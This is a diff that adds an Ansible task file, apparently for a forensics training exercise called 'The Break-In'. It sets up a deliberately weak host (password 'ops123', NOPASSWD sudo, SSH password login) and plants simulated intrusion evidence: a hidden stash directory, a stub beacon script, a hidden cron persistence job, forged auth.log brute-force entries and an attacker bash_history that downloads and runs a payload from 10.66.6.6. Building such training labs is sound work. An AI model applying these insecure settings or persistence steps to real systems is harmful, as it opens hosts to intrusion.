@@ -1,0 +1,89 @@
+---
+# for-t1 "The Break-In" — plants a complete intrusion: brute-force auth.log
+# entries, attacker bash_history, /tmp stash, cron persistence. Trainee is
+# 'analyst' (sudo for reading). Flags injected post-deploy into the stash
+# and beside the cron job.
+- name: analyst read-only account
+  ansible.builtin.user:
+    name: analyst
+    password: "{{ 'analysis' | password_hash('sha512') }}"
+    shell: /bin/bash
+    home: /home/analyst
+    create_home: true
+
+- name: compromised ops account (weak password — the way in)
+  ansible.builtin.user:
+    name: ops
+    password: "{{ 'ops123' | password_hash('sha512') }}"
+    shell: /bin/bash
+    home: /home/ops
+    create_home: true
+
+- name: analyst may read anything (triage account)
+  ansible.builtin.copy:
+    dest: /etc/sudoers.d/90-analyst
+    content: "analyst ALL=(root) NOPASSWD: ALL\n"
+    mode: "0440"
+    validate: visudo -cf %s
+
+- name: ops had NOPASSWD sudo (the real escalation — attacker used it)
+  ansible.builtin.copy:
+    dest: /etc/sudoers.d/91-ops
+    content: "ops ALL=(root) NOPASSWD: ALL\n"
+    mode: "0440"
+    validate: visudo -cf %s
+
+- name: ssh password auth on (brute force succeeded)
+  ansible.builtin.lineinfile:
+    path: /etc/ssh/sshd_config
+    regexp: "^#?PasswordAuthentication"
+    line: "PasswordAuthentication yes"
+  notify: restart sshd
+
+- name: plant attacker stash dir
+  ansible.builtin.file:
+    path: /tmp/.x11-cache
+    state: directory
+    owner: root
+    mode: "0755"
+
+- name: plant fake persistence payload
+  ansible.builtin.copy:
+    dest: /tmp/.x11-cache/upd
+    content: "#!/bin/sh\n# beacon — phones home every 10min\n"
+    mode: "0755"
+
+- name: plant cron persistence (flag lands beside it post-deploy)
+  ansible.builtin.copy:
+    dest: /etc/cron.d/.sysupdate
+    content: "*/10 * * * * root /tmp/.x11-cache/upd >/dev/null 2>&1\n"
+    mode: "0644"
+
+- name: plant attacker bash_history on ops (the roadmap)
+  ansible.builtin.copy:
+    dest: /home/ops/.bash_history
+    content: |
+      sudo mkdir /tmp/.x11-cache
+      cd /tmp/.x11-cache
+      sudo curl -o /tmp/.x11-cache/upd http://10.66.6.6/upd
+      sudo chmod +x /tmp/.x11-cache/upd
+      sudo bash -c "echo '*/10 * * * * root /tmp/.x11-cache/upd' > /etc/cron.d/.sysupdate"
+      sudo ls -la /tmp/.x11-cache/
+      exit
+    owner: ops
+    mode: "0600"
+
+- name: plant brute-force entries in auth.log (syslog format)
+  ansible.builtin.blockinfile:
+    path: /var/log/auth.log
+    marker: "# {mark} PENTRAIN FOR-T1 EVIDENCE"
+    block: |
+      Mar 15 03:12:07 evidence01 sshd[1881]: Failed password for invalid user admin from 10.66.6.6 port 51234 ssh2
+      Mar 15 03:12:19 evidence01 sshd[1881]: Failed password for invalid user test from 10.66.6.6 port 51234 ssh2
+      Mar 15 03:12:31 evidence01 sshd[1887]: Failed password for ops from 10.66.6.6 port 51300 ssh2
+      Mar 15 03:12:44 evidence01 sshd[1887]: Failed password for ops from 10.66.6.6 port 51300 ssh2
+      Mar 15 03:12:58 evidence01 sshd[1887]: Failed password for ops from 10.66.6.6 port 51300 ssh2
+      Mar 15 03:12:59 evidence01 sshd[1887]: Accepted password for ops from 10.66.6.6 port 51300 ssh2
+      Mar 15 03:12:59 evidence01 sshd[1887]: pam_unix(sshd:session): session opened for user ops
+      Mar 15 03:13:10 evidence01 sudo: ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/mkdir /tmp/.x11-cache
+    create: true
